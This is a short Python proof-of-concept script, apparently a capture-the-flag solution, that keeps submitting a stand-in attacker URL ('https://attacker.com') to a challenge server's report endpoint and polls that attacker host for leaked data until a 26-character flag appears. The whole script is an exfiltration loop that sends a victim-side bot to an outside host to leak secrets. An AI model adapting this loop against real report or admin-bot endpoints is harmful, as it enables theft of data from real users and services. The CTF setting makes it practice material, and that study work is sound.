import time
import requests

host = "http://challenge.stdio.2600.in.th:31718/api/report"
exfil = "https://attacker.com"

while True:
    print("[PoC] Send next leak..")
    response = requests.post(host, json={"url": exfil})

    # check current leak flag
    r = requests.get(exfil + "/info")

    sttf = r.json().get("sttf", False)

    if sttf:
        print("Current leak: ", sttf)
        if len(sttf) == 26:
            print("Found the flag: ", sttf)
            break

    time.sleep(3)
